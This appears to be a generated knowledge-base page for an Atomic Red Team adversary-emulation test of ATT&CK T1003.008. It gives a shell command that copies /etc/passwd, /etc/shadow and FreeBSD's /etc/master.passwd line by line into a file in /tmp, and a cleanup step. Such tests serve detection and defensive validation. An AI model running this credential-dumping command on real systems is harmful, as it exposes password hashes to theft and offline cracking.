---
atomic_guid: "f5aa6543-6cb2-4fae-b9c2-b96e14721713"
title: "Access /etc/{shadow,passwd,master.passwd} with shell builtins"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.008"
attack_technique_name: "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "f5aa6543-6cb2-4fae-b9c2-b96e14721713"
  - "Access /etc/{shadow,passwd,master.passwd} with shell builtins"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Access /etc/{shadow,passwd,master.passwd} with shell builtins

Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins

## Metadata

- Atomic GUID: f5aa6543-6cb2-4fae-b9c2-b96e14721713
- Technique: T1003.008: OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Source Path: atomics/T1003.008/T1003.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.008]]

## Input Arguments

### output_file

- description: Path where captured results will be placed
- type: path
- default: /tmp/T1003.008.txt

## Executor

- elevation_required: True
- name: sh

### Command

```bash
testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
[ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow
```

### Cleanup

```bash
rm -f #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.yaml)
